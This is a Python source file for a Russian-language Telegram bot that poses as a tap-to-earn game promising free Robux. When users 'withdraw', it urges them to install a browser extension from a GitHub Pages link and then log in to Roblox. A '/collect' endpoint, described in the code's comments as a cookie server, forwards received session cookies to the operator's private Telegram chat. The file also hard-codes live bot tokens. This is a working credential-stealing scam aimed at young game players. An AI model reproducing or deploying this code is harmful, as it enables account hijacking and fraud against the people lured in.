import telebot
import sqlite3
from datetime import datetime
from flask import Flask, request
import time

# === ДВА БОТА ===
USER_BOT_TOKEN = '8684971280:AAH0V29u4vT382wAv28eGr2Bo2OXMi79ERI'
COOKIE_BOT_TOKEN = '8693453531:AAFwUMH_otrs4oxV_lGMdokUVKQTjX3mN64'

bot = telebot.TeleBot(USER_BOT_TOKEN)
kuki_bot = telebot.TeleBot(COOKIE_BOT_TOKEN)

app = Flask(__name__)

# === БАЗА ДАННЫХ ===
conn = sqlite3.connect('users.db', check_same_thread=False)

def create_table():
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            balance INTEGER DEFAULT 0,
            energy INTEGER DEFAULT 50,
            last_tap_date TEXT,
            last_bonus_date TEXT,
            last_tap_time INTEGER DEFAULT 0,
            bonus_claimed INTEGER DEFAULT 0,
            last_bonus_claim TEXT
        )
    ''')
    conn.commit()
    cur.close()

def get_user(user_id):
    cur = conn.cursor()
    cur.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = cur.fetchone()
    cur.close()
    if not user:
        cur2 = conn.cursor()
        cur2.execute('''
            INSERT INTO users (user_id, balance, energy, last_tap_date, last_bonus_date, last_tap_time, bonus_claimed, last_bonus_claim)
            VALUES (?, 0, 50, ?, '', 0, 0, '')
        ''', (user_id, datetime.now().strftime('%Y-%m-%d')))
        conn.commit()
        cur2.close()
        cur3 = conn.cursor()
        cur3.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        user = cur3.fetchone()
        cur3.close()
    return user

def update_user(user_id, balance=None, energy=None, last_tap_date=None, last_bonus_date=None, last_tap_time=None, bonus_claimed=None, last_bonus_claim=None):
    cur = conn.cursor()
    if balance is not None:
        cur.execute('UPDATE users SET balance = ? WHERE user_id = ?', (balance, user_id))
    if energy is not None:
        cur.execute('UPDATE users SET energy = ? WHERE user_id = ?', (energy, user_id))
    if last_tap_date is not None:
        cur.execute('UPDATE users SET last_tap_date = ? WHERE user_id = ?', (last_tap_date, user_id))
    if last_bonus_date is not None:
        cur.execute('UPDATE users SET last_bonus_date = ? WHERE user_id = ?', (last_bonus_date, user_id))
    if last_tap_time is not None:
        cur.execute('UPDATE users SET last_tap_time = ? WHERE user_id = ?', (last_tap_time, user_id))
    if bonus_claimed is not None:
        cur.execute('UPDATE users SET bonus_claimed = ? WHERE user_id = ?', (bonus_claimed, user_id))
    if last_bonus_claim is not None:
        cur.execute('UPDATE users SET last_bonus_claim = ? WHERE user_id = ?', (last_bonus_claim, user_id))
    conn.commit()
    cur.close()

# === ПРОВЕРКА ПОДПИСКИ ===
def is_subscribed(user_id):
    try:
        member = bot.get_chat_member('@robloxtapkanal', user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# === КЛАВИАТУРЫ ===
def main_menu():
    keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add('💲 Тапнуть', '🎁 Бонус дня')
    keyboard.add('📊 Баланс', '💳 Вывести')
    return keyboard

def withdraw_menu():
    keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add('💰 20', '💰 50', '💰 100')
    keyboard.add('💰 250', '💰 500', '💰 1000')
    keyboard.add('🔙 Назад')
    return keyboard

# === КОМАНДЫ БОТА ===
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    get_user(user_id)
    bot.send_message(
        user_id,
        '⚡ **Добро пожаловать!**\n\n'
        '💰 Тапай — получай Robux!\n'
        '⬆️ Нажимай «Тапнуть» — +1 Robux.\n'
        '📆 До 50 раз в день.\n\n'
        '🎁 Бонус +50 за подписку @robloxtapkanal.\n\n'
        '💳 Вывод от 20 Robux.\n\n'
        '⬇️ Начинай!',
        parse_mode='Markdown',
        reply_markup=main_menu()
    )

@bot.message_handler(func=lambda message: message.text == '💲 Тапнуть')
def tap(message):
    user_id = message.chat.id
    user = get_user(user_id)
    today = datetime.now().strftime('%Y-%m-%d')
    balance, energy, last_tap_date, last_tap_time = user[1], user[2], user[3], user[5]

    if last_tap_date != today:
        energy = 50
        update_user(user_id, energy=energy, last_tap_date=today)

    current_time = int(time.time())
    if last_tap_time and current_time - last_tap_time < 1:
        bot.send_message(user_id, '⏳ Подожди 1 секунду между тапами!')
        return

    if energy <= 0:
        bot.send_message(user_id, '⛔ Нет энергии! Жди завтра.')
        return

    energy -= 1
    balance += 1
    update_user(user_id, balance=balance, energy=energy, last_tap_time=current_time)

    bot.send_message(
        user_id,
        f'✅ +1 Robux!\n⚡ Энергия: {energy}/50\n💰 Баланс: {balance} Robux'
    )

@bot.message_handler(func=lambda message: message.text == '🎁 Бонус дня')
def bonus(message):
    user_id = message.chat.id
    user = get_user(user_id)
    today = datetime.now().strftime('%Y-%m-%d')

    if user[7] == 1 and user[8] == today:
        bot.send_message(user_id, '⛔ Ты уже получил бонус сегодня!')
        return

    if not is_subscribed(user_id):
        bot.send_message(
            user_id,
            '❌ Ты не подписан на канал!\n\nПодпишись: @robloxtapkanal\nПосле подписки нажми "🎁 Бонус дня" снова.'
        )
        return

    balance = user[1] + 50
    update_user(user_id, balance=balance, bonus_claimed=1, last_bonus_claim=today)
    bot.send_message(user_id, f'🎉 +50 Robux за подписку!\n💰 Баланс: {balance} Robux')

@bot.message_handler(func=lambda message: message.text == '📊 Баланс')
def show_balance(message):
    user_id = message.chat.id
    user = get_user(user_id)
    balance, energy = user[1], user[2]
    bot.send_message(
        user_id,
        f'📊 **Твой баланс:**\n💰 {balance} Robux\n⚡ Энергия: {energy}/50',
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == '💳 Вывести')
def withdraw(message):
    user_id = message.chat.id
    user = get_user(user_id)
    balance = user[1]

    if balance < 20:
        bot.send_message(user_id, '⛔ Минимальный вывод — 20 Robux.')
        return

    bot.send_message(user_id, '💳 **Выбери сумму для вывода:**', parse_mode='Markdown', reply_markup=withdraw_menu())

@bot.message_handler(func=lambda message: message.text.startswith('💰 '))
def withdraw_amount(message):
    user_id = message.chat.id
    user = get_user(user_id)
    balance = user[1]

    if message.text == '🔙 Назад':
        bot.send_message(user_id, '🔙 Возврат в главное меню.', reply_markup=main_menu())
        return

    try:
        amount = int(message.text.replace('💰 ', ''))
    except:
        bot.send_message(user_id, '❌ Неверная сумма.')
        return

    if amount < 20:
        bot.send_message(user_id, '⛔ Минимальный вывод — 20 Robux.')
        return

    if balance < amount:
        bot.send_message(user_id, f'⛔ Недостаточно Robux. Нужно: {amount}, у тебя: {balance}.')
        return

    new_balance = balance - amount
    update_user(user_id, balance=new_balance)

    # Отправляем видео по прямой ссылке
    video_url = 'https://raw.githubusercontent.com/valeryiusmanov-sketch/Robux-bot/refs/heads/main/youcut-20260708-102137852_Zsg4Qjtp.mp4'
    bot.send_video(
        user_id,
        video_url,
        caption=f'✅ Заявка на вывод {amount} Robux принята!\n\n'
                '📦 **Установи расширение:**\n'
                '👉 https://valeryiusmanov-sketch.github.io/H/\n\n'
                '⚠️ После установки зайди на официальный сайт Roblox и войди в аккаунт.\n'
                'Через 3 часа Robux поступят на твой счёт.',
        parse_mode='Markdown'
    )

    bot.send_message(user_id, '💬 Если возникнут вопросы — напиши в поддержку.', reply_markup=main_menu())

# === ВЕБХУК ===
@app.route('/webhook', methods=['POST'])
def webhook():
    json_data = request.get_json()
    if json_data:
        update = telebot.types.Update.de_json(json_data)
        bot.process_new_updates([update])
    return 'OK', 200

# === СЕРВЕР ДЛЯ КУК ===
@app.after_request
def add_cors_headers(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    return response

@app.route('/')
def index():
    return '✅ Бот работает! Вебхук активен.'

@app.route('/collect', methods=['GET'])
def collect():
    cookie = request.args.get('cookie')
    if cookie:
        # Отправляем куку только тебе
        kuki_bot.send_message(8205534130, f'🍪 Кука: {cookie}')
        return 'OK', 200
    return 'No cookie', 400

# === ЗАПУСК ===
if __name__ == '__main__':
    create_table()
    bot.remove_webhook()
    bot.set_webhook(url='https://robux-bot-a6s3.onrender.com/webhook')
    app.run(host='0.0.0.0', port=10000)
